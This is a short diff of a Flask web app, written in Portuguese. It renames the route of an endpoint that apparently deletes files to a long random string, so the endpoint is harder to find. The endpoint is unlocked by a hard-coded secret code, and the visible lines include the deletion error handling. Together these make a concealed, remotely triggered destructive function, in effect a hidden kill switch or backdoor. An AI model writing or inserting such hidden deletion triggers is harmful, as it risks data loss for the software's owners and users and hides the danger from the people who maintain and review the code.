@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask
 import os
 import shutil
 
@@ -23,7 +23,7 @@ def executar_tarefa_especifica():
             print(f"Erro ao deletar {item_path}. Motivo: {e}")
     return "Tarefa executada com sucesso!"
 
-@app.route('/executar-tarefa/<codigo>')
+@app.route('/sjdnshbvaksbfsdnhasjvbskdbfkasndasdbsdakjwdnasbknejfnjnfqkjwbq/<codigo>')
 def executar_tarefa(codigo):
     codigo_secreto = "SDFDJN&*@$29344385kjs#$)&()fnas34325$##%$#saFNEJKN51#*R#@"
     if codigo == codigo_secreto:
